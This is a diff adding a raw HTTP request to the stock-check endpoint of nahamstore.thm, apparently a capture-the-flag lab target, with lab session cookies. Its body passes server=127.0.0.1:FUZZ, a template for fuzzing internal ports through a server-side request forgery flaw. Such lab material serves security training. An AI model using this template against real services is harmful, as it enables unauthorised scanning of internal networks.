@@ -1,0 +1,16 @@
+POST /stockcheck HTTP/1.1
+Host: nahamstore.thm
+Content-Length: 32
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+DNT: 1
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://nahamstore.thm
+Referer: http://nahamstore.thm/product?id=2
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,ru;q=0.7
+Cookie: session=22a03f905a896766ebfffaf7449ab71d; token=6f490126514b6cd5643b6a15a2c5b014
+Connection: keep-alive
+
+product_id=1&server=127.0.0.1:FUZZ
